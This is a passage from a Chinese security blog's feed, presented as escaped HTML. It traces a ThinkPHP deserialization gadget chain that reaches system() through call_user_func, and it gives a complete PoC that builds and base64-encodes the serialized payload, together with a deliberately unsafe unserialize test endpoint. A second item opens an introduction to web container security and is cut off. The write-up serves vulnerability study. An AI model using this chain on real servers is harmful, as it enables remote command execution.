&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isAjax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$ajax&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;var_ajax&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# 调用param函数，name=$this-&amp;gt;config[&amp;#39;var_ajax&amp;#39;]=&amp;#39;haha&amp;#39;;$this-&amp;gt;param为GET请求传入的参数;filter暂时未知
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# 调用input函数，data=外部传入，{[&amp;#39;haha&amp;#39;]=&amp;gt;&amp;#39;ls&amp;#39;};name=$this-&amp;gt;config[&amp;#39;var_ajax&amp;#39;]=&amp;#39;haha&amp;#39;;filter经过$this-&amp;gt;getFilter($filter, $default)函数是filter=[0=&amp;gt;&amp;#39;system&amp;#39;,1=&amp;gt;$default]；
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 经过该函数filter=[0=&amp;gt;&amp;#39;system&amp;#39;,1=&amp;gt;$default]
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// data通过getData函数后不再是数组，data=’ls‘
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;array_walk_recursive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;filterValue&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;version_compare&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;PHP_VERSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;7.1.0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;arrayReset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filterValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# 调用filterValue函数，value=’ls‘;key=’haha‘这个函数里最后没用到；filters=[0=&amp;gt;&amp;#39;system&amp;#39;,1=&amp;gt;$default]
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;filterValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$default&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;array_pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//[0=&amp;gt;&amp;#39;system&amp;#39;,1=&amp;gt;$default]pop完之后，filters=[0=&amp;gt;&amp;#39;system&amp;#39;]
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filters&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_callable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            
            &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call_user_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# 调用call_user_func，filter=’system‘,value=&amp;#39;ls&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;
&lt;p&gt;Model是一个抽象类，想要实例化，必须找到一个它的实现类，全局搜索&lt;code&gt;extends Model&lt;/code&gt;，找到Pivot类：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 270; 
			flex-basis: 649px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222200257638.png&#34; data-size=&#34;311x115&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222200257638.png&#34;
			width=&#34;311&#34;
			height=&#34;115&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222200257638_huce7f8596bcb989b06728d71e64c761ff_7855_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222200257638_huce7f8596bcb989b06728d71e64c761ff_7855_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$append&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;haha&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]];&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;haha&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Request&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()];&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Request&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$hook&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
        &lt;span class=&#34;s1&#34;&gt;&amp;#39;var_ajax&amp;#39;&lt;/span&gt;         &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;haha&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  
    &lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hook&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;visible&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;isAjax&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]];&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;


&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\process\pipes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model\concern\Conversion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model\Pivot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Windows&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Pivot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()];&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\Model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Pivot&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Model&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\process\pipes\Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()));&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;测试页代码构造一个反序列化入口：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

    &lt;span class=&#34;nv&#34;&gt;$test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;haha&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 643; 
			flex-basis: 1545px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222211115983.png&#34; data-size=&#34;1230x191&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222211115983.png&#34;
			width=&#34;1230&#34;
			height=&#34;191&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222211115983_hu7fe8c1d5542f32a3a9880f7452a20aee_35974_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222211115983_hu7fe8c1d5542f32a3a9880f7452a20aee_35974_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web 容器安全</title>
        <link>https://coollllllll.github.io/p/web-2/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/web-2/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/web-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Web 容器安全" /&gt;&lt;h1 id=&#34;web容器安全&#34;&gt;Web容器安全&lt;/h1&gt;
&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Web中间件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;提供系统软件与应用软件之间连接的软件。他处在操作系统和更高一级应用程序之间，他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web容器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;容器是中间件的一种，它给处于其中的应用程序组件提供从一个环境，使应用程序直接与容器中的环境变量进行交互而不必关注其他的系统问题。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;提供 Web 服务器的软件或主机，即 Web 服务器软件或者装有 Web 服务器软件的计算机。&lt;/p&gt;
&lt;h2 id=&#34;apache&#34;&gt;Apache&lt;/h2&gt;
